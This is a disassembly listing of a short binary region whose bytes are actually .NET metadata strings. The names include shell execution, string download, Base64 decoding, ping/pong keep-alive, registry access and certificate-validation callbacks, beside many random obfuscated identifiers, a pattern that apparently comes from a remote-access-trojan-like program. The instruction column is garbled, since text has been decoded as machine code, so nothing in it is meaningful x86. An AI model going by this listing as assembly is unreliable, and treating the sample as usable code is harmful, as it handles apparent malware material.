  408a4f:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408a56:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  408a5d:	65 66 61             	gs popaw
  408a60:	75 6c                	jne    0x408ace
  408a62:	74 4d                	je     0x408ab1
  408a64:	65 6d                	gs insl (%dx),%es:(%edi)
  408a66:	62 65 72             	bound  %esp,0x72(%ebp)
  408a69:	41                   	inc    %ecx
  408a6a:	74 74                	je     0x408ae0
  408a6c:	72 69                	jb     0x408ad7
  408a6e:	62 75 74             	bound  %esi,0x74(%ebp)
  408a71:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408a75:	6d                   	insl   (%dx),%es:(%edi)
  408a76:	70 69                	jo     0x408ae1
  408a78:	6c                   	insb   (%dx),%es:(%edi)
  408a79:	61                   	popa
  408a7a:	74 69                	je     0x408ae5
  408a7c:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7e:	52                   	push   %edx
  408a7f:	65 6c                	gs insb (%dx),%es:(%edi)
  408a81:	61                   	popa
  408a82:	78 61                	js     0x408ae5
  408a84:	74 69                	je     0x408aef
  408a86:	6f                   	outsl  %ds:(%esi),(%dx)
  408a87:	6e                   	outsb  %ds:(%esi),(%dx)
  408a88:	73 41                	jae    0x408acb
  408a8a:	74 74                	je     0x408b00
  408a8c:	72 69                	jb     0x408af7
  408a8e:	62 75 74             	bound  %esi,0x74(%ebp)
  408a91:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a95:	73 65                	jae    0x408afc
  408a97:	6d                   	insl   (%dx),%es:(%edi)
  408a98:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408a9c:	72 6f                	jb     0x408b0d
  408a9e:	64 75 63             	fs jne 0x408b04
  408aa1:	74 41                	je     0x408ae4
  408aa3:	74 74                	je     0x408b19
  408aa5:	72 69                	jb     0x408b10
  408aa7:	62 75 74             	bound  %esi,0x74(%ebp)
  408aaa:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408aae:	73 65                	jae    0x408b15
  408ab0:	6d                   	insl   (%dx),%es:(%edi)
  408ab1:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  408ab6:	70 79                	jo     0x408b31
  408ab8:	72 69                	jb     0x408b23
  408aba:	67 68 74 41 74 74    	addr16 push $0x74744174
  408ac0:	72 69                	jb     0x408b2b
  408ac2:	62 75 74             	bound  %esi,0x74(%ebp)
  408ac5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408ac9:	73 65                	jae    0x408b30
  408acb:	6d                   	insl   (%dx),%es:(%edi)
  408acc:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408ad0:	6f                   	outsl  %ds:(%esi),(%dx)
  408ad1:	6d                   	insl   (%dx),%es:(%edi)
  408ad2:	70 61                	jo     0x408b35
  408ad4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ad5:	79 41                	jns    0x408b18
  408ad7:	74 74                	je     0x408b4d
  408ad9:	72 69                	jb     0x408b44
  408adb:	62 75 74             	bound  %esi,0x74(%ebp)
  408ade:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408ae2:	6e                   	outsb  %ds:(%esi),(%dx)
  408ae3:	74 69                	je     0x408b4e
  408ae5:	6d                   	insl   (%dx),%es:(%edi)
  408ae6:	65 43                	gs inc %ebx
  408ae8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ae9:	6d                   	insl   (%dx),%es:(%edi)
  408aea:	70 61                	jo     0x408b4d
  408aec:	74 69                	je     0x408b57
  408aee:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408af1:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408af8:	69 
  408af9:	62 75 74             	bound  %esi,0x74(%ebp)
  408afc:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408b00:	74 5f                	je     0x408b61
  408b02:	55                   	push   %ebp
  408b03:	73 65                	jae    0x408b6a
  408b05:	53                   	push   %ebx
  408b06:	68 65 6c 6c 45       	push   $0x456c6c65
  408b0b:	78 65                	js     0x408b72
  408b0d:	63 75 74             	arpl   %esi,0x74(%ebp)
  408b10:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408b14:	61                   	popa
  408b15:	64 42                	fs inc %edx
  408b17:	79 74                	jns    0x408b8d
  408b19:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408b1d:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408b24:	00 
  408b25:	6f                   	outsl  %ds:(%esi),(%dx)
  408b26:	52                   	push   %edx
  408b27:	46                   	inc    %esi
  408b28:	58                   	pop    %eax
  408b29:	56                   	push   %esi
  408b2a:	72 58                	jb     0x408b84
  408b2c:	64 55                	fs push %ebp
  408b2e:	75 65                	jne    0x408b95
  408b30:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  408b34:	65 74 65             	gs je  0x408b9c
  408b37:	56                   	push   %esi
  408b38:	61                   	popa
  408b39:	6c                   	insb   (%dx),%es:(%edi)
  408b3a:	75 65                	jne    0x408ba1
  408b3c:	00 47 65             	add    %al,0x65(%edi)
  408b3f:	74 56                	je     0x408b97
  408b41:	61                   	popa
  408b42:	6c                   	insb   (%dx),%es:(%edi)
  408b43:	75 65                	jne    0x408baa
  408b45:	00 53 65             	add    %dl,0x65(%ebx)
  408b48:	74 56                	je     0x408ba0
  408b4a:	61                   	popa
  408b4b:	6c                   	insb   (%dx),%es:(%edi)
  408b4c:	75 65                	jne    0x408bb3
  408b4e:	00 61 47             	add    %ah,0x47(%ecx)
  408b51:	53                   	push   %ebx
  408b52:	54                   	push   %esp
  408b53:	66 6b 41 48 76       	imul   $0x76,0x48(%ecx),%ax
  408b58:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408b5c:	74 5f                	je     0x408bbd
  408b5e:	4b                   	dec    %ebx
  408b5f:	65 65 70 41          	gs gs jo 0x408ba4
  408b63:	6c                   	insb   (%dx),%es:(%edi)
  408b64:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408b6b:	5f                   	pop    %edi
  408b6c:	4b                   	dec    %ebx
  408b6d:	65 65 70 41          	gs gs jo 0x408bb2
  408b71:	6c                   	insb   (%dx),%es:(%edi)
  408b72:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408b79:	6f                   	outsl  %ds:(%esi),(%dx)
  408b7a:	76 65                	jbe    0x408be1
  408b7c:	00 73 65             	add    %dh,0x65(%ebx)
  408b7f:	74 5f                	je     0x408be0
  408b81:	42                   	inc    %edx
  408b82:	6c                   	insb   (%dx),%es:(%edi)
  408b83:	6f                   	outsl  %ds:(%esi),(%dx)
  408b84:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408b87:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408b8e:	5f                   	pop    %edi
  408b8f:	54                   	push   %esp
  408b90:	6f                   	outsl  %ds:(%esi),(%dx)
  408b91:	74 61                	je     0x408bf4
  408b93:	6c                   	insb   (%dx),%es:(%edi)
  408b94:	53                   	push   %ebx
  408b95:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408b9c:	5f                   	pop    %edi
  408b9d:	48                   	dec    %eax
  408b9e:	65 61                	gs popa
  408ba0:	64 65 72 53          	fs gs jb 0x408bf7
  408ba4:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408bab:	5f                   	pop    %edi
  408bac:	48                   	dec    %eax
  408bad:	65 61                	gs popa
  408baf:	64 65 72 53          	fs gs jb 0x408c06
  408bb3:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408bba:	5f                   	pop    %edi
  408bbb:	53                   	push   %ebx
  408bbc:	65 6e                	outsb  %gs:(%esi),(%dx)
  408bbe:	64 42                	fs inc %edx
  408bc0:	75 66                	jne    0x408c28
  408bc2:	66 65 72 53          	data16 gs jb 0x408c19
  408bc6:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408bcd:	5f                   	pop    %edi
  408bce:	52                   	push   %edx
  408bcf:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408bd3:	76 65                	jbe    0x408c3a
  408bd5:	42                   	inc    %edx
  408bd6:	75 66                	jne    0x408c3e
  408bd8:	66 65 72 53          	data16 gs jb 0x408c2f
  408bdc:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408be3:	5f                   	pop    %edi
  408be4:	4b                   	dec    %ebx
  408be5:	65 79 53             	gs jns 0x408c3b
  408be8:	69 7a 65 00 48 46 79 	imul   $0x79464800,0x65(%edx),%edi
  408bef:	6c                   	insb   (%dx),%es:(%edi)
  408bf0:	4f                   	dec    %edi
  408bf1:	57                   	push   %edi
  408bf2:	4a                   	dec    %edx
  408bf3:	63 69 45             	arpl   %ebp,0x45(%ecx)
  408bf6:	66 00 6f 73          	data16 add %ch,0x73(%edi)
  408bfa:	66 6a 67             	pushw  $0x67
  408bfd:	5a                   	pop    %edx
  408bfe:	46                   	inc    %esi
  408bff:	55                   	push   %ebp
  408c00:	44                   	inc    %esp
  408c01:	48                   	dec    %eax
  408c02:	54                   	push   %esp
  408c03:	66 00 4b 6c          	data16 add %cl,0x6c(%ebx)
  408c07:	41                   	inc    %ecx
  408c08:	66 64 71 65          	data16 fs jno 0x408c71
  408c0c:	42                   	inc    %edx
  408c0d:	64 57                	fs push %edi
  408c0f:	66 00 51 59          	data16 add %dl,0x59(%ecx)
  408c13:	41                   	inc    %ecx
  408c14:	62 47 44             	bound  %eax,0x44(%edi)
  408c17:	71 68                	jno    0x408c81
  408c19:	63 4f 4f             	arpl   %ecx,0x4f(%edi)
  408c1c:	63 66 00             	arpl   %esp,0x0(%esi)
  408c1f:	6b 41 42 67          	imul   $0x67,0x42(%ecx),%eax
  408c23:	4d                   	dec    %ebp
  408c24:	48                   	dec    %eax
  408c25:	6b 46 65 62          	imul   $0x62,0x65(%esi),%eax
  408c29:	4c                   	dec    %esp
  408c2a:	51                   	push   %ecx
  408c2b:	64 63 66 00          	arpl   %esp,%fs:0x0(%esi)
  408c2f:	77 68                	ja     0x408c99
  408c31:	4a                   	dec    %edx
  408c32:	42                   	inc    %edx
  408c33:	4b                   	dec    %ebx
  408c34:	66 42                	inc    %dx
  408c36:	73 54                	jae    0x408c8c
  408c38:	59                   	pop    %ecx
  408c39:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408c3d:	79 70                	jns    0x408caf
  408c3f:	74 6f                	je     0x408cb0
  408c41:	43                   	inc    %ebx
  408c42:	6f                   	outsl  %ds:(%esi),(%dx)
  408c43:	6e                   	outsb  %ds:(%esi),(%dx)
  408c44:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408c4a:	74 5f                	je     0x408cab
  408c4c:	50                   	push   %eax
  408c4d:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c54:	5f                   	pop    %edi
  408c55:	50                   	push   %eax
  408c56:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c5d:	74 65                	je     0x408cc4
  408c5f:	6d                   	insl   (%dx),%es:(%edi)
  408c60:	2e 54                	cs push %esp
  408c62:	68 72 65 61 64       	push   $0x64616572
  408c67:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c6e:	5f                   	pop    %edi
  408c6f:	50                   	push   %eax
  408c70:	61                   	popa
  408c71:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408c78:	64 64 
  408c7a:	5f                   	pop    %edi
  408c7b:	53                   	push   %ebx
  408c7c:	65 73 73             	gs jae 0x408cf2
  408c7f:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c86:	6e                   	outsb  %ds:(%esi),(%dx)
  408c87:	67 00 55 54          	add    %dl,0x54(%di)
  408c8b:	46                   	inc    %esi
  408c8c:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408c8f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408c92:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408c99:	74 65                	je     0x408d00
  408c9b:	6d                   	insl   (%dx),%es:(%edi)
  408c9c:	2e 44                	cs inc %esp
  408c9e:	72 61                	jb     0x408d01
  408ca0:	77 69                	ja     0x408d0b
  408ca2:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca3:	67 2e 49             	addr16 cs dec %ecx
  408ca6:	6d                   	insl   (%dx),%es:(%edi)
  408ca7:	61                   	popa
  408ca8:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408caf:	73 
  408cb0:	74 65                	je     0x408d17
  408cb2:	6d                   	insl   (%dx),%es:(%edi)
  408cb3:	2e 52                	cs push %edx
  408cb5:	75 6e                	jne    0x408d25
  408cb7:	74 69                	je     0x408d22
  408cb9:	6d                   	insl   (%dx),%es:(%edi)
  408cba:	65 2e 56             	gs cs push %esi
  408cbd:	65 72 73             	gs jb  0x408d33
  408cc0:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408cc7:	46                   	inc    %esi
  408cc8:	72 6f                	jb     0x408d39
  408cca:	6d                   	insl   (%dx),%es:(%edi)
  408ccb:	42                   	inc    %edx
  408ccc:	61                   	popa
  408ccd:	73 65                	jae    0x408d34
  408ccf:	36 34 53             	ss xor $0x53,%al
  408cd2:	74 72                	je     0x408d46
  408cd4:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408cdb:	61                   	popa
  408cdc:	73 65                	jae    0x408d43
  408cde:	36 34 53             	ss xor $0x53,%al
  408ce1:	74 72                	je     0x408d55
  408ce3:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408cea:	6e                   	outsb  %ds:(%esi),(%dx)
  408ceb:	6c                   	insb   (%dx),%es:(%edi)
  408cec:	6f                   	outsl  %ds:(%esi),(%dx)
  408ced:	61                   	popa
  408cee:	64 53                	fs push %ebx
  408cf0:	74 72                	je     0x408d64
  408cf2:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408cf9:	74 72                	je     0x408d6d
  408cfb:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408d02:	5f                   	pop    %edi
  408d03:	41                   	inc    %ecx
  408d04:	73 53                	jae    0x408d59
  408d06:	74 72                	je     0x408d7a
  408d08:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408d0f:	5f                   	pop    %edi
  408d10:	41                   	inc    %ecx
  408d11:	73 53                	jae    0x408d66
  408d13:	74 72                	je     0x408d87
  408d15:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408d1c:	53                   	push   %ebx
  408d1d:	74 72                	je     0x408d91
  408d1f:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408d26:	73 74                	jae    0x408d9c
  408d28:	72 69                	jb     0x408d93
  408d2a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2b:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408d2f:	73 74                	jae    0x408da5
  408d31:	65 6d                	gs insl (%dx),%es:(%edi)
  408d33:	2e 44                	cs inc %esp
  408d35:	72 61                	jb     0x408d98
  408d37:	77 69                	ja     0x408da2
  408d39:	6e                   	outsb  %ds:(%esi),(%dx)
  408d3a:	67 00 68 6c          	add    %ch,0x6c(%bx,%si)
  408d3e:	4e                   	dec    %esi
  408d3f:	6a 6c                	push   $0x6c
  408d41:	69 6b 53 57 4a 51 58 	imul   $0x58514a57,0x53(%ebx),%ebp
  408d48:	6c                   	insb   (%dx),%es:(%edi)
  408d49:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4a:	67 00 67 65          	add    %ah,0x65(%bx)
  408d4e:	74 5f                	je     0x408daf
  408d50:	41                   	inc    %ecx
  408d51:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d55:	61                   	popa
  408d56:	74 65                	je     0x408dbd
  408d58:	50                   	push   %eax
  408d59:	6f                   	outsl  %ds:(%esi),(%dx)
  408d5a:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5b:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408d5f:	74 5f                	je     0x408dc0
  408d61:	41                   	inc    %ecx
  408d62:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d66:	61                   	popa
  408d67:	74 65                	je     0x408dce
  408d69:	50                   	push   %eax
  408d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  408d6b:	6e                   	outsb  %ds:(%esi),(%dx)
  408d6c:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408d70:	74 5f                	je     0x408dd1
  408d72:	45                   	inc    %ebp
  408d73:	72 72                	jb     0x408de7
  408d75:	6f                   	outsl  %ds:(%esi),(%dx)
  408d76:	72 44                	jb     0x408dbc
  408d78:	69 61 6c 6f 67 00 74 	imul   $0x7400676f,0x6c(%ecx),%esp
  408d7f:	46                   	inc    %esi
  408d80:	57                   	push   %edi
  408d81:	43                   	inc    %ebx
  408d82:	51                   	push   %ecx
  408d83:	4e                   	dec    %esi
  408d84:	6d                   	insl   (%dx),%es:(%edi)
  408d85:	75 68                	jne    0x408def
  408d87:	48                   	dec    %eax
  408d88:	70 52                	jo     0x408ddc
  408d8a:	62 77 67             	bound  %esi,0x67(%edi)
  408d8d:	00 42 52             	add    %al,0x52(%edx)
  408d90:	79 59                	jns    0x408deb
  408d92:	6e                   	outsb  %ds:(%esi),(%dx)
  408d93:	49                   	dec    %ecx
  408d94:	49                   	dec    %ecx
  408d95:	63 65 69             	arpl   %esp,0x69(%ebp)
  408d98:	62 68 00             	bound  %ebp,0x0(%eax)
  408d9b:	6a 52                	push   $0x52
  408d9d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d9e:	64 78 4c             	fs js  0x408ded
  408da1:	55                   	push   %ebp
  408da2:	4b                   	dec    %ebx
  408da3:	7a 4f                	jp     0x408df4
  408da5:	6f                   	outsl  %ds:(%esi),(%dx)
  408da6:	4d                   	dec    %ebp
  408da7:	77 4c                	ja     0x408df5
  408da9:	6a 68                	push   $0x68
  408dab:	00 43 6f             	add    %al,0x6f(%ebx)
  408dae:	6d                   	insl   (%dx),%es:(%edi)
  408daf:	70 75                	jo     0x408e26
  408db1:	74 65                	je     0x408e18
  408db3:	48                   	dec    %eax
  408db4:	61                   	popa
  408db5:	73 68                	jae    0x408e1f
  408db7:	00 56 65             	add    %dl,0x65(%esi)
  408dba:	72 69                	jb     0x408e25
  408dbc:	66 79 48             	data16 jns 0x408e07
  408dbf:	61                   	popa
  408dc0:	73 68                	jae    0x408e2a
  408dc2:	00 46 6c             	add    %al,0x6c(%esi)
  408dc5:	75 73                	jne    0x408e3a
  408dc7:	68 00 67 65 74       	push   $0x74656700
  408dcc:	5f                   	pop    %edi
  408dcd:	45                   	inc    %ebp
  408dce:	78 65                	js     0x408e35
  408dd0:	63 75 74             	arpl   %esi,0x74(%ebp)
  408dd3:	61                   	popa
  408dd4:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408dd8:	61                   	popa
  408dd9:	74 68                	je     0x408e43
  408ddb:	00 47 65             	add    %al,0x65(%edi)
  408dde:	74 54                	je     0x408e34
  408de0:	65 6d                	gs insl (%dx),%es:(%edi)
  408de2:	70 50                	jo     0x408e34
  408de4:	61                   	popa
  408de5:	74 68                	je     0x408e4f
  408de7:	00 67 65             	add    %ah,0x65(%edi)
  408dea:	74 5f                	je     0x408e4b
  408dec:	4c                   	dec    %esp
  408ded:	65 6e                	outsb  %gs:(%esi),(%dx)
  408def:	67 74 68             	addr16 je 0x408e5a
  408df2:	00 67 48             	add    %ah,0x48(%edi)
  408df5:	68 58 47 46 59       	push   $0x59464758
  408dfa:	52                   	push   %edx
  408dfb:	64 52                	fs push %edx
  408dfd:	47                   	inc    %edi
  408dfe:	6e                   	outsb  %ds:(%esi),(%dx)
  408dff:	5a                   	pop    %edx
  408e00:	4f                   	dec    %edi
  408e01:	44                   	inc    %esp
  408e02:	69 00 51 72 4d 6f    	imul   $0x6f4d7251,(%eax),%eax
  408e08:	4b                   	dec    %ebx
  408e09:	45                   	inc    %ebp
  408e0a:	57                   	push   %edi
  408e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e0c:	73 6b                	jae    0x408e79
  408e0e:	6c                   	insb   (%dx),%es:(%edi)
  408e0f:	75 4a                	jne    0x408e5b
  408e11:	69 00 46 77 69 74    	imul   $0x74697746,(%eax),%eax
  408e17:	74 6b                	je     0x408e84
  408e19:	67 45                	addr16 inc %ebp
  408e1b:	59                   	pop    %ecx
  408e1c:	4b                   	dec    %ebx
  408e1d:	69 00 78 47 78 69    	imul   $0x69784778,(%eax),%eax
  408e23:	55                   	push   %ebp
  408e24:	67 4d                	addr16 dec %ebp
  408e26:	47                   	inc    %edi
  408e27:	7a 4a                	jp     0x408e73
  408e29:	6a 4e                	push   $0x4e
  408e2b:	69 00 74 51 43 6b    	imul   $0x6b435174,(%eax),%eax
  408e31:	6c                   	insb   (%dx),%es:(%edi)
  408e32:	64 61                	fs popa
  408e34:	6e                   	outsb  %ds:(%esi),(%dx)
  408e35:	56                   	push   %esi
  408e36:	6d                   	insl   (%dx),%es:(%edi)
  408e37:	49                   	dec    %ecx
  408e38:	63 69 00             	arpl   %ebp,0x0(%ecx)
  408e3b:	5a                   	pop    %edx
  408e3c:	71 4e                	jno    0x408e8c
  408e3e:	44                   	inc    %esp
  408e3f:	49                   	dec    %ecx
  408e40:	74 64                	je     0x408ea6
  408e42:	62 50 6c             	bound  %edx,0x6c(%eax)
  408e45:	64 69 00 44 72 78 76 	imul   $0x76787244,%fs:(%eax),%eax
  408e4c:	4b                   	dec    %ebx
  408e4d:	52                   	push   %edx
  408e4e:	45                   	inc    %ebp
  408e4f:	46                   	inc    %esi
  408e50:	45                   	inc    %ebp
  408e51:	6f                   	outsl  %ds:(%esi),(%dx)
  408e52:	6a 69                	push   $0x69
  408e54:	00 76 45             	add    %dh,0x45(%esi)
  408e57:	55                   	push   %ebp
  408e58:	75 46                	jne    0x408ea0
  408e5a:	44                   	inc    %esp
  408e5b:	63 6f 4e             	arpl   %ebp,0x4e(%edi)
  408e5e:	4b                   	dec    %ebx
  408e5f:	4c                   	dec    %esp
  408e60:	54                   	push   %esp
  408e61:	71 69                	jno    0x408ecc
  408e63:	00 55 72             	add    %dl,0x72(%ebp)
  408e66:	69 00 71 54 74 58    	imul   $0x58745471,(%eax),%eax
  408e6c:	79 4a                	jns    0x408eb8
  408e6e:	74 52                	je     0x408ec2
  408e70:	43                   	inc    %ebx
  408e71:	4d                   	dec    %ebp
  408e72:	41                   	inc    %ecx
  408e73:	6a 00                	push   $0x0
  408e75:	76 7a                	jbe    0x408ef1
  408e77:	59                   	pop    %ecx
  408e78:	67 67 56             	addr16 addr16 push %esi
  408e7b:	62 4d 58             	bound  %ecx,0x58(%ebp)
  408e7e:	70 44                	jo     0x408ec4
  408e80:	6a 00                	push   $0x0
  408e82:	61                   	popa
  408e83:	4d                   	dec    %ebp
  408e84:	47                   	inc    %edi
  408e85:	63 45 6a             	arpl   %eax,0x6a(%ebp)
  408e88:	43                   	inc    %ebx
  408e89:	62 46 44             	bound  %eax,0x44(%esi)
  408e8c:	49                   	dec    %ecx
  408e8d:	6a 00                	push   $0x0
  408e8f:	6a 48                	push   $0x48
  408e91:	6a 75                	push   $0x75
  408e93:	54                   	push   %esp
  408e94:	65 4a                	gs dec %edx
  408e96:	4f                   	dec    %edi
  408e97:	70 75                	jo     0x408f0e
  408e99:	47                   	inc    %edi
  408e9a:	61                   	popa
  408e9b:	6a 6a                	push   $0x6a
  408e9d:	00 42 70             	add    %al,0x70(%edx)
  408ea0:	73 4b                	jae    0x408eed
  408ea2:	6a 49                	push   $0x49
  408ea4:	57                   	push   %edi
  408ea5:	67 72 71             	addr16 jb 0x408f19
  408ea8:	4d                   	dec    %ebp
  408ea9:	74 6a                	je     0x408f15
  408eab:	00 75 76             	add    %dh,0x76(%ebp)
  408eae:	51                   	push   %ecx
  408eaf:	57                   	push   %edi
  408eb0:	4b                   	dec    %ebx
  408eb1:	76 5a                	jbe    0x408f0d
  408eb3:	62 6c 53 61          	bound  %ebp,0x61(%ebx,%edx,2)
  408eb7:	65 74 6a             	gs je  0x408f24
  408eba:	00 42 72             	add    %al,0x72(%edx)
  408ebd:	78 42                	js     0x408f01
  408ebf:	66 59                	pop    %cx
  408ec1:	41                   	inc    %ecx
  408ec2:	63 76 56             	arpl   %esi,0x56(%esi)
  408ec5:	48                   	dec    %eax
  408ec6:	6b 00 75             	imul   $0x75,(%eax),%eax
  408ec9:	52                   	push   %edx
  408eca:	5a                   	pop    %edx
  408ecb:	65 61                	gs popa
  408ecd:	4d                   	dec    %ebp
  408ece:	68 52 55 52 4e       	push   $0x4e525552
  408ed3:	62 71 59             	bound  %esi,0x59(%ecx)
  408ed6:	6b 00 41             	imul   $0x41,(%eax),%eax
  408ed9:	73 79                	jae    0x408f54
  408edb:	6e                   	outsb  %ds:(%esi),(%dx)
  408edc:	63 43 61             	arpl   %eax,0x61(%ebx)
  408edf:	6c                   	insb   (%dx),%es:(%edi)
  408ee0:	6c                   	insb   (%dx),%es:(%edi)
  408ee1:	62 61 63             	bound  %esp,0x63(%ecx)
  408ee4:	6b 00 52             	imul   $0x52,(%eax),%eax
  408ee7:	65 6d                	gs insl (%dx),%es:(%edi)
  408ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  408eea:	74 65                	je     0x408f51
  408eec:	43                   	inc    %ebx
  408eed:	65 72 74             	gs jb  0x408f64
  408ef0:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408ef7:	56                   	push   %esi
  408ef8:	61                   	popa
  408ef9:	6c                   	insb   (%dx),%es:(%edi)
  408efa:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408f01:	43 
  408f02:	61                   	popa
  408f03:	6c                   	insb   (%dx),%es:(%edi)
  408f04:	6c                   	insb   (%dx),%es:(%edi)
  408f05:	62 61 63             	bound  %esp,0x63(%ecx)
  408f08:	6b 00 54             	imul   $0x54,(%eax),%eax
  408f0b:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408f12:	6c                   	insb   (%dx),%es:(%edi)
  408f13:	62 61 63             	bound  %esp,0x63(%ecx)
  408f16:	6b 00 52             	imul   $0x52,(%eax),%eax
  408f19:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408f20:	4b 65 
  408f22:	79 50                	jns    0x408f74
  408f24:	65 72 6d             	gs jb  0x408f94
  408f27:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408f2e:	68 65 63 6b 00       	push   $0x6b6365
  408f33:	46                   	inc    %esi
  408f34:	6c                   	insb   (%dx),%es:(%edi)
  408f35:	75 73                	jne    0x408faa
  408f37:	68 46 69 6e 61       	push   $0x616e6946
  408f3c:	6c                   	insb   (%dx),%es:(%edi)
  408f3d:	42                   	inc    %edx
  408f3e:	6c                   	insb   (%dx),%es:(%edi)
  408f3f:	6f                   	outsl  %ds:(%esi),(%dx)
  408f40:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408f43:	5a                   	pop    %edx
  408f44:	4d                   	dec    %ebp
  408f45:	76 61                	jbe    0x408fa8
  408f47:	49                   	dec    %ecx
  408f48:	46                   	inc    %esi
  408f49:	79 64                	jns    0x408faf
  408f4b:	78 4e                	js     0x408f9b
  408f4d:	6d                   	insl   (%dx),%es:(%edi)
  408f4e:	6b 00 78             	imul   $0x78,(%eax),%eax
  408f51:	45                   	inc    %ebp
  408f52:	6f                   	outsl  %ds:(%esi),(%dx)
  408f53:	67 79 74             	addr16 jns 0x408fca
  408f56:	6b 63 75 6f          	imul   $0x6f,0x75(%ebx),%esp
  408f5a:	78 75                	js     0x408fd1
  408f5c:	6b 00 59             	imul   $0x59,(%eax),%eax
  408f5f:	54                   	push   %esp
  408f60:	5a                   	pop    %edx
  408f61:	6b 78 75 6c          	imul   $0x6c,0x75(%eax),%edi
  408f65:	68 6a 56 48 79       	push   $0x7948566a
  408f6a:	6b 00 44             	imul   $0x44,(%eax),%eax
  408f6d:	72 51                	jb     0x408fc0
  408f6f:	53                   	push   %ebx
  408f70:	4b                   	dec    %ebx
  408f71:	74 76                	je     0x408fe9
  408f73:	69 4e 47 7a 49 6c 00 	imul   $0x6c497a,0x47(%esi),%ecx
  408f7a:	4b                   	dec    %ebx
  408f7b:	4e                   	dec    %esi
  408f7c:	41                   	inc    %ecx
  408f7d:	49                   	dec    %ecx
  408f7e:	53                   	push   %ebx
  408f7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f80:	63 54 70 4f          	arpl   %edx,0x4f(%eax,%esi,2)
  408f84:	66 48                	dec    %ax
  408f86:	4e                   	dec    %esi
  408f87:	6c                   	insb   (%dx),%es:(%edi)
  408f88:	00 75 64             	add    %dh,0x64(%ebp)
  408f8b:	6d                   	insl   (%dx),%es:(%edi)
  408f8c:	41                   	inc    %ecx
  408f8d:	7a 56                	jp     0x408fe5
  408f8f:	72 78                	jb     0x409009
